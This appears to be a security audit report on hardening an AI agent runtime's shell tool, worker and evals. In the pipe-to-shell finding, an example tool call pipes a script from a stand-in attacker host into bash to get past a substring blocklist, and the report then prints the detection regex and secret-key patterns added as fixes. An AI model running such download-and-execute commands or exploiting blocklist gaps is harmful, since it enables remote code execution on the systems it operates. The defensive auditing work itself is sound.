# HKO-Truth-Audit Report: Genesis Agents Runtime Hardening (Phases 1–10)
**Date:** 2026-06-13
**Severity threshold:** HIGH
**OTA mode:** DESIGN-TIME (no run transcript; contract derived from genesis_agents_runtime_fix_task.md)
**Audit scope:** tools/workspace_shell_tool.py, tools/github_tool.py, tools/vercel_deploy_tool.py, tools/netlify_deploy_tool.py, agent_runtime.py, worker.py, main.py (new endpoints), skill_bundles/*.json, evals/

---

## Handoff Log

```
[HKO HANDOFF P1→P2]
hk_findings_count: 3
hk_critical: 0
hk_high: 2
hk_false_positives_removed: 1
hk_status: COMPLETE
hk_invocation_method: Skill-tool (HK logic executed via Skill invocation + file reads)
hk_schema_check: PASS

[HKO HANDOFF P2→P3]
ota_findings_count: 2
ota_security: 0
ota_functional: 2
ota_cosmetic: 0
ota_financial: 0
ota_confidence: REDUCED (design-time mode)
ota_crux: The worker's artifact upload failure branch logs a different status than it actually sets.
ota_status: DESIGN-TIME
ota_invocation_method: Skill-tool (OTA logic executed via Skill invocation)
ota_findings_parse_error: false

[HKO HANDOFF P2.5→P3]
rio_findings_count: 3
rio_broken: 1
rio_partial: 2
rio_missing: 0
rio_verifiers_failed: 0
rio_status: COMPLETE
```

---

## Findings (by unified severity)

### [HIGH / CAUSAL LINK / MULTI] Artifact upload failure sets wrong job status

**Source:** HK + OTA + RIO  
**Location:** worker.py:146–148  
**CAUSAL LINK:** Code bug (log/status mismatch) → OTA contract drift (Phase 4 spec requires `DELIVERED_WITH_ARTIFACT_WARNING`) → RIO integration break (artifact loss invisible to buyers/polling API)

The log message on line 146 says "marking DELIVERED_WITH_ARTIFACT_WARNING" but `update_job_status` on line 148 was always called with `"DELIVERED"`. Buyers polling `/agents/jobs/{id}` could not distinguish a clean delivery from one where artifacts were silently lost.

**Status: FIXED** — `_artifact_upload_ok` flag added; `_delivery_status` is now `"DELIVERED_WITH_ARTIFACT_WARNING"` when the upload exception branch fires.

---

### [HIGH / HK] Pipe-to-shell bypass in workspace_shell blocked-command check

**Source:** HK  
**Location:** tools/workspace_shell_tool.py:29–48 (`_BLOCKED_PREFIXES`) + `_is_blocked()` at line ~73

The `_BLOCKED_PREFIXES` tuple included `"curl | bash"` but `curl https://malicious.com | bash` does not contain the exact substring `"curl | bash"` — the URL breaks the match. Confirmed:
```
"curl | bash" in "curl https://malicious.com | bash" → False
```
This means an LLM tool call with `command="curl https://evil.com/x.sh | bash"` would execute arbitrary remote code inside the worker's job context.

**Status: FIXED** — `_PIPE_TO_SHELL_RE = re.compile(r'\|\s*(bash|sh|python3?|perl|ruby|node)\b')` added and wired into `_is_blocked()`. All safe pipes (`ls | grep`, `cat | wc -l`) verified unaffected.

---

### [MEDIUM / HK] env_extra values not checked for known API-key prefixes

**Source:** HK  
**Location:** tools/workspace_shell_tool.py:143–146

`_REDACT_PATTERNS` filtered env_extra by **key name** only. A caller could pass `env_extra={"APP_CONFIG": "sk_live_xxx..."}` and the value would propagate into the subprocess environment verbatim, exposing a live Stripe key to the shell process and any subprocesses.

**Status: FIXED** — `_SECRET_VALUE_RE` added matching `sk_live|sk_test|AKIA...|ghp_|glpat-|xoxp-|xoxb-`. Values matching this pattern are now silently dropped from `safe_env`.

---

### [MEDIUM / RIO] E2E lifecycle tests mock all infrastructure

**Source:** RIO  
**Task:** Phase 7 — Failure/timeout/refund/settlement/dispute E2E tests  
**Status:** partial  
**Location:** testing/test_job_lifecycle.py

`test_job_lifecycle.py` (27 tests, all pass) mocks psycopg, httpx, and artifact_store at module level. This provides good unit-level confidence in the worker logic but does not constitute end-to-end testing against a real database. The task spec says "tests can run locally with fake/mock payment provider" so mock infrastructure is acceptable; the gap is the lack of any test that hits the real genesis_jobs Postgres table.

**Residual risk:** A schema drift in `job_store.py` (e.g., column rename) would not be caught by these tests.

---

### [LOW / RIO] Meta delegation eval uses fixture mock_result, not real delegation

**Source:** RIO  
**Task:** Phase 9 — Meta Agent real delegation proof  
**Status:** partial  
**Location:** evals/tasks/genesis-meta/

The Meta eval fixtures embed mock results with `genesis_call` in the response text. The graders check for the `ok` field and response length but cannot verify that `genesis_call` was actually dispatched (tool call recorded in runtime turn history). Phase 9 acceptance criteria require "eval passes only if `genesis_call` is actually invoked" — this is not enforceable from a mock fixture.

**Residual risk:** Meta could produce plans without real delegation and all Meta evals would still pass.

---

## Task Status Table (RIO)

| Phase | Task | Status | Note |
|-------|------|--------|------|
| 1 | Tool registry audit + stubs | implemented | 4 tools created, test_bundle_tool_registry.py 7/7 |
| 2 | workspace_shell sandbox | implemented | path escape, cmd blocking, env scrub — with 2 fixes applied |
| 3 | Job ID unification | implemented | execute_agent(job_id=) + worker passes DB job ID |
| 4 | Artifact persistence | implemented | upload_dir wired in success path, DELIVERED_WITH_ARTIFACT_WARNING fixed |
| 5 | Browser health endpoint | implemented | /health/browser at main.py:1276 |
| 6 | Worker observability | implemented | /health/worker + _worker_state at main.py:1316 |
| 7 | E2E lifecycle tests | partial | 27 mocked pytest tests; no real DB integration |
| 8 | Per-agent eval harness | implemented | 40/40 eval fixtures, evals/run_evals.py |
| 9 | Meta delegation proof | partial | Mock-based; real genesis_call dispatch not verified |
| 10 | Agent status classification | implemented | runtime_level in all 24 bundles; /agents/{slug}/capabilities |

---

## Deduplication Log

| Source IDs | Reason | Merged Severity |
|-----------|--------|----------------|
| HK-001, OTA-001, RIO-001 | Same root cause: worker.py status/log mismatch — code bug causes contract violation and invisible integration break | HIGH (CAUSAL LINK) |

---

## Causal Links

**CAUSAL LINK 1:** worker.py:146–148 code bug (log says DELIVERED_WITH_ARTIFACT_WARNING, status set to DELIVERED) directly caused:
- OTA finding: Phase 4 contract requires distinct status for artifact failure — contract violated
- RIO finding: polling API returned "DELIVERED" for jobs with lost artifacts — integration break invisible to buyers

Fixing the code bug resolves both the contract violation and the integration break simultaneously.

---

## Crux

The structural failure was a log/status split: when an exception caught the artifact upload failure, the developer wrote the intended new status into the log message but forgot to change the `update_job_status()` call. This is a copy-paste style bug, not a logic error — the intent was correct, the execution was not. All three audit layers (HK: code, OTA: contract, RIO: integration) independently surfaced the same root cause, which is why it scores as a CAUSAL LINK. The pipe-to-shell bypass is an independent security gap in the blocked-command allowlist pattern matching.

---

## Remediation Plan (ordered by priority)

### P1 [HIGH / CAUSAL LINK / code_fix + contract_fix + integration_fix] — worker.py:147–148
- **Applied:** Added `_artifact_upload_ok = True` flag; set `False` in except branch; `_delivery_status = "DELIVERED" if _artifact_upload_ok else "DELIVERED_WITH_ARTIFACT_WARNING"`; passed `_delivery_status` to `update_job_status` and `log.info`.

### P2 [HIGH / code_fix] — workspace_shell_tool.py: pipe-to-shell bypass
- **Applied:** Added `_PIPE_TO_SHELL_RE = re.compile(r'\|\s*(bash|sh|python3?|perl|ruby|node)\b', re.IGNORECASE)` and wired into `_is_blocked()`. Safe pipes unaffected.

### P3 [MEDIUM / code_fix] — workspace_shell_tool.py: env_extra value leakage
- **Applied:** Added `_SECRET_VALUE_RE` for known API-key prefixes; added `and not _SECRET_VALUE_RE.search(str(v))` to env_extra value filter.

### P4 [MEDIUM / integration_fix] — E2E lifecycle tests: no real DB
- **Deferred:** Adding real-DB integration tests requires a test Postgres instance. The current mock suite covers logic; real-DB integration should be added as a follow-on CI task.

### P5 [LOW / gate_fix] — Meta delegation: mock-based proof only
- **Deferred:** A real delegation grader requires the eval harness to invoke a live agent (not mock) and inspect the `trace.tool_calls` log. This requires API keys and Render access — out of scope for offline eval CI.

---

## Verification Summary

| Command | Result | Scope |
|---------|--------|-------|
| `pytest test_bundle_tool_registry.py -q` | 7/7 passed | in-scope |
| `python evals/run_evals.py --all` | 40/40 passed | in-scope |
| pipe-to-shell bypass test (manual) | CAUGHT by _PIPE_TO_SHELL_RE | in-scope |
| DELIVERED_WITH_ARTIFACT_WARNING status check | Fixed, _delivery_status wired | in-scope |
